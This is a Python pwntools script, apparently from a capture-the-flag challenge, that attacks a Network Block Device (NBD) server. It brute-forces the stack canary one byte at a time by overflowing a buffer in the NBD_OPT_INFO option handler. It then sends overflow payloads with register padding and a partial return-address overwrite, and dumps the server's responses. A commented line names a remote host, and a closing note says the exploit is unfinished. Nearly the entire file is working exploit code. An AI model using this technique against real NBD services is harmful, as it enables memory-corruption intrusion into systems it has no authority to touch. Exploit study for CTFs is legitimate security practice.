from pwn import *

UINT32_MAX = (1 << 32) - 1


def new_connection():
    con = remote("localhost", 10809)
    # con = remote("47.242.113.232", 49176)

    assert con.recvn(8) == b"NBDMAGIC"
    assert con.recvn(8) == b"IHAVEOPT"

    handshake_flag = con.recvn(2)
    con.send(p32(1, endian="big"))

    return con


def handle_info(con, send_len, data):
    con.send(b"IHAVEOPT")

    # NBD_OPT_INFO
    con.send(p32(6, endian="big"))

    con.send(p32(send_len, endian="big"))
    con.send(p32(send_len - 4, endian="big"))

    assert len(data) == send_len - 4
    con.send(data)
    con.send(data)

    # n_requests
    con.send(b"\x00\x00")


def handle_test(con):
    con.send(b"IHAVEOPT")

    # Does not exist
    con.send(p32(0xDEADBEEF, endian="big"))
    con.send(p32(0, endian="big"))


canary = b"\x00g?\xad\xea_\xa7\x86"

while len(canary) < 8:
    for c_try in range(256):
        candidate = canary + bytes([c_try])

        con = new_connection()

        # len - 4 == 1032 + len(candidate)
        try_len = 1036 + len(candidate)
        handle_info(con, try_len, b"x" * 1032 + candidate)

        try:
            handle_test(con)
            con.recvuntil(b"given option is unknown")

            # we guessed the canary successfully
            canary = candidate
            con.close()
            break
        except EOFError:
            con.close()


for i in range(16):
    con = new_connection()

    overflow_len = 1036 + 8 + 8 + 0x30 + 2

    rbx = rbp = r12 = r13 = r14 = r15 = p64(0x1234)
    r13 = p64(4)
    r14 = r15 = p64(4)

    payload = b"a" * 1032 + canary
    payload += p64(0)
    payload += rbx
    payload += rbp
    payload += r12
    payload += r13
    payload += r14
    payload += r15

    payload += p16((i << 12) + 0xDAC)

    handle_info(con, overflow_len, payload)
    con.recvuntil(b"Export unknown")

    print(canary)
    print(hexdump(con.recvall(timeout=1)))

# Exploit partially done, see `solver.py` for jinmo123's final exploit
